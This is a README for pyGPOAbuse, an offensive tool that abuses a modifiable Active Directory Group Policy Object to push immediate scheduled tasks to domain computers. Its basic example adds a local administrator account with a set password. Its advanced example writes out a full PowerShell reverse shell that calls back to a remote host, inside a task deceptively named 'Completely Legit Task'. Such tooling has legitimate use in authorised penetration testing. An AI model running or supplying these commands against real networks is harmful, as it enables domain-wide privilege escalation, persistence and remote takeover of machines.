# pyGPOAbuse

## Description

Python **partial** implementation of [SharpGPOAbuse](https://github.com/FSecureLABS/SharpGPOAbuse) by[@pkb1s](https://twitter.com/pkb1s)

This tool can be used when a controlled account can modify an existing GPO that applies to one or more users & computers. It will create an **immediate scheduled task** as **SYSTEM** on the remote computer for computer GPO, or as logged in user for user GPO.

Default behavior adds a local administrator.

![Example](https://github.com/Hackndo/pygpoabuse/raw/master/assets/demo.gif)

## How to use

### Basic usage

Add **john** user to local administrators group (Password: **H4x00r123..**)

```bash
./pygpoabuse.py DOMAIN/user -hashes lm:nt -gpo-id "12345677-ABCD-9876-ABCD-123456789012"
``` 

### Advanced usage

Reverse shell example

```bash
./pygpoabuse.py DOMAIN/user -hashes lm:nt -gpo-id "12345677-ABCD-9876-ABCD-123456789012" \ 
    -powershell \ 
    -command "\$client = New-Object System.Net.Sockets.TCPClient('10.20.0.2',1234);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> ';\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()" \ 
    -taskname "Completely Legit Task" \
    -description "Dis is legit, pliz no delete" \ 
    -user
``` 


## Credits

* [@pkb1s](https://twitter.com/pkb1s) for [SharpGPOAbuse](https://github.com/FSecureLABS/SharpGPOAbuse)
* [@airman604](https://twitter.com/airman604) for [schtask_now.py](https://github.com/airman604/schtask_now)
* [@SkelSec](https://twitter.com/skelsec) for [msldap](https://github.com/skelsec/msldap)

